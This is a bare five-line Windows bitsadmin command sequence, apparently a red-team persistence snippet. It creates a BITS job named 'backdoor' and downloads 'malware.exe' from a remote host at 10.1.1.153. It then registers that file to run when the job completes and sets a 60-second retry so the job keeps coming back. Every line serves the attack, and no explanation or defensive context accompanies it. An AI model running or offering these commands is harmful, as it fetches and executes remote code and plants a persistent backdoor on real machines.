bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.1.1.153/malware.exe"  "C:\malware.exe"
bitsadmin /SetNotifyCmdLine backdoor C:\malware.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor